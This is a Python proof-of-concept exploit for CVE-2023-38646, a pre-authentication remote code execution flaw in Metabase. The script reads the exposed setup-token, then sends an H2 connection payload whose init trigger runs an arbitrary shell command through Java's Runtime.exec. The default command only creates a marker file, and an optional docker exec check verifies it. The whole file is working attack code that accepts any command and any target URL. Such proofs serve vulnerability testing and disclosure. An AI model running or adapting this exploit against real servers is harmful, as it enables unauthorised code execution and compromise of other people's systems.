#!/usr/bin/env python3
"""CVE-2023-38646 — Metabase pre-authentication RCE proof of concept.
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
import urllib.error
import urllib.request

MARKER = "/tmp/metabase-pwned"


def fetch_setup_token(base_url: str) -> str:
    with urllib.request.urlopen(f"{base_url}/api/session/properties", timeout=60) as response:
        properties = json.load(response)
    token = properties.get("setup-token")
    if not token:
        raise SystemExit("no setup-token in /api/session/properties (already set up?)")
    return token


def build_payload(token: str, command: str) -> dict:
    init = (
        "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
        f"\tjava.lang.Runtime.getRuntime().exec(\"{command}\")\n$$"
    )
    return {
        "token": token,
        "details": {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules": {},
            "details": {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
                "advanced-options": False,
                "ssl": True,
                "init": init,
            },
            "name": "pwn",
            "engine": "h2",
        },
    }


def post_payload(base_url: str, payload: dict) -> None:
    request = urllib.request.Request(
        f"{base_url}/api/setup/validate",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(request, timeout=120) as response:
            print(f">> HTTP {response.status}")
            print(response.read().decode()[:180])
    except urllib.error.HTTPError as error:
        body = error.read().decode()
        print(f">> HTTP {error.code}")
        print(body[:180])
        # The trigger is created before H2 reports the syntax error, so an error
        # response does not mean the command did not run; the marker decides.
        if "Syntax error" in body or "trigger" in body.lower():
            print(">> the created trigger is expected to have executed the command")


def main() -> int:
    parser = argparse.ArgumentParser(description="CVE-2023-38646 proof of concept")
    parser.add_argument("--base-url", default="http://127.0.0.1:3000")
    parser.add_argument("--cmd", default=f"touch {MARKER}")
    parser.add_argument("--container", help="check for the marker with docker exec")
    args = parser.parse_args()

    print(f"== target: {args.base_url} ==")
    token = fetch_setup_token(args.base_url)
    print(f"setup-token leaked without authentication: {token}")

    print(f"== sending /api/setup/validate with an h2 init payload: {args.cmd}")
    post_payload(args.base_url, build_payload(token, args.cmd))

    if args.container:
        print(f"== proof: docker exec {args.container} ls -l {MARKER}")
        result = subprocess.run(
            ["docker", "exec", args.container, "ls", "-l", MARKER],
            capture_output=True,
            text=True,
        )
        print(result.stdout.strip() or result.stderr.strip())
        if result.returncode == 0:
            print(">> VULNERABLE: the command executed inside the container")
            return 0
        print(f">> NOT EXPLOITABLE: {MARKER} does not exist")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
